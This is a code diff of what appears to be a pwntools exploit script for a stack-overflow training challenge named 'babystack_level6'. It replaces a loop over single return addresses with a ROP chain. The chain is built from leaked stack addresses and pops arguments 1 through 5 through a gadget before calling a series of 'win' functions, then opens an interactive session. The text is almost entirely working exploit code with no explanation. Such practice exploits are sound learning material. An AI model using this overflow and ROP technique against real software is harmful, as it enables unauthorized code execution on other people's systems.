@@ -40,16 +40,26 @@ win2 =[0x4013d6,
   0x401453,	
   0x401454]	
 
-win3 = [0x40135f]
+# for i in win2:
+#     print(hex(i))
+#     r = process("/challenge/babystack_level6")
+#     r.recvuntil(b"base pointer rbp: ")
+#     bp = int(r.recvline(keepends=False), 16)
+#     r.recvuntil(b"will be stored: ")
+#     buf = int(r.recvline(keepends=False), 16)
+#     padding = bp - buf + 8
+#     payload1 =  b'a'* padding + p64(i)
+#     r.sendline(payload1)
+#     r.interactive()
 
-for i in win3:
-    print(hex(i))
-    r = process("/challenge/babystack_level6")
-    r.recvuntil(b"base pointer rbp: ")
-    bp = int(r.recvline(keepends=False), 16)
-    r.recvuntil(b"will be stored: ")
-    buf = int(r.recvline(keepends=False), 16)
-    padding = bp - buf + 8
-    payload1 =  b'a'* padding + p64(i)
-    r.sendline(payload1)
-    r.interactive()
+r = process("/challenge/babystack_level6")
+r.recvuntil(b"base pointer rbp: ")
+bp = int(r.recvline(keepends=False), 16)
+r.recvuntil(b"will be stored: ")
+buf = int(r.recvline(keepends=False), 16)
+padding = bp - buf + 8
+
+payload1 =  b'a'* padding + p64(0x4018b3) + p64(0x1) + p64(0x40135f) + p64(0x4018b3) + p64(0x2) + p64(0x4013d6) + p64(0x4018b3) + p64(0x3) + p64(0x401455) + p64(0x4018b3) + p64(0x4) + p64(0x4014d4) + p64(0x4018b3) + p64(0x5) + p64(0x401553)
+r.sendline(payload1)
+r.interactive()
+
